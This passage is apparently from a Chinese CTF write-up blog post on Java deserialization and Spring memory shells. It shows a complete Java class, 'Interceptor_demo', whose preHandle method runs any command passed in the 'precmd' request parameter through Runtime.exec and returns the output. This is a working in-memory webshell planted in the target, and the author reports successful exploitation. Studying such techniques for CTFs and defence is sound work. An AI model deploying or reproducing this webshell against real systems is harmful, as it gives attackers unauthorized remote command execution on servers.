</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">precmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;precmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">precmd</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;!</span><span class="n">precmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">precmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InputStreamReader</span><span class="w"> </span><span class="n">isr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">isr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">br</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;æ‰§è¡Œå‘½ä»¤æ—¶å‡ºç°å¼‚å¸¸: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;preprepreprepreprepre&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// è¿™é‡Œå¯ä»¥è¿›è¡Œæƒé™éªŒè¯ç­‰æ“ä½œï¼Œå¦‚æœéªŒè¯ä¸é€šè¿‡å¯ä»¥è¿”å› false ä¸­æ–­è¯·æ±‚å¤„ç†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//    public Interceptor_demo(String a) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">postHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">mv</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;postpostpostpostpost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;afterafterafterafter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>æœ€åæˆåŠŸåˆ©ç”¨</strong>hhh</p>
<p><img loading="lazy" src="../images/image-20241202115907199.png" alt="image-20241202115907199"  />
</p>
<ul>
<li>é¢˜ç›®é™„ä»¶ï¼š6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xTlBBUlhLLWNrWGNTQU9QVHlybGxLUT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=ï¼ˆè‡ªè¡ŒBase64è§£ç ï¼‰</li>
</ul>
<p>å‚è€ƒï¼š</p>
<blockquote>
<p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a></p>
<p><a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD">https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD</a></p>
<p><a href="https://xiinnn.com/posts/2023zjctf-pre-secobj/#signedobject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%A8hsts%E5%A5%97%E5%A8%83%E8%A7%A6%E5%8F%91">2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›åˆèµ› secObj</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>Springå†…å­˜é©¬</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>Commons-Collections1-7</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
